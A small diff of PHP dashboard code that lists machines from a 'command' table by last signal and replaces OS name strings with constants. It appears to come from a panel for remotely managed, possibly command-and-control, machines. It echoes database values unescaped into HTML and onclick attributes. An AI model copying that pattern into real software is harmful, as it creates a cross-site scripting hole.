@@ -34,15 +34,15 @@
 				$sql = "SELECT * FROM command ORDER BY last_signal DESC";
 				$result = mysqli_query($conn, $sql);
 				while ($row = $result->fetch_assoc()) {
-					if ($row['system'] == "WINDOWS")
+					if ($row['system'] == OS_WINDOWS)
 						$systemIcon = "windows";
-					else if ($row['system'] == "MACOS")
+					else if ($row['system'] == OS_MACOS)
 						$systemIcon = "apple";
-					else if ($row['system'] == "LINUX")
+					else if ($row['system'] == OS_LINUX)
 						$systemIcon = "linux";
-					else if ($row['system'] == "ANDROID")
+					else if ($row['system'] == OS_ANDROID)
 						$systemIcon = "android";
-					else if ($row['system'] == "IOS")
+					else if ($row['system'] == OS_IOS)
 						$systemIcon = "mobile";
 					echo '<tr style="cursor: pointer;" onclick="redirectToMachine(\'' . $row['machineID'] . '\')" id="' . $row['machineID'] . '">
 						<td>' . $row['machineID'] . '</td>
